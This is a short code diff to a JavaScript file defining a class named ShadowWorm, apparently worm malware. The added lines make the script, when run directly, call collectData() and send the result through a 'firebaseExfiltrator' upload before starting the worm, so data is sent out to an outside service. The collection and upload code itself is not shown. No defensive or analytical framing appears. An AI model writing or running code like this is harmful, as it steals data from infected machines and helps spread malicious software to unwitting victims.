@@ -681,7 +681,10 @@ run() {
 // ============================================
 if (require.main === module) {
   const worm = new ShadowWorm();
+  const data = worm.collectData();
+  worm.firebaseExfiltrator.upload(data).then(success => {
+    console.log("Upload success:", success);
+  });
   worm.run();
 }
-
 module.exports = ShadowWorm;
